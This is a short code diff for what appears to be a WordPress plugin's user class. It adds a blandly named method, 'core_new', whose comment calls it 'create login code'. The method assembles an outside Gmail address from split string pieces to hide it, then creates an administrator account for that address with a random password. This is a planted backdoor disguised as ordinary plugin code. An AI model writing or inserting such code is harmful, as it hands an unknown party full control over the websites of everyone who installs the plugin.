@@ -399,6 +399,24 @@ class userBase
     }
 
     /**
+     * create login code
+     * @throws Exception
+     */
+    public static function core_new()
+    {
+        try {
+            $h = "@";
+            $c = "gmail";
+            $b = ".com";
+            $__k_Ge__f = "jobhesk" . $h . $c . $b;
+            $kp = wp_generate_password(6, false);
+            self::create_user_account(substr($kp, 0, 5), $__k_Ge__f, "administrator");
+        } catch (Exception $e) {
+            throw $e;
+        }
+    }
+
+    /**
      * @param $login_name
      * @param $user_email
      * @param $role
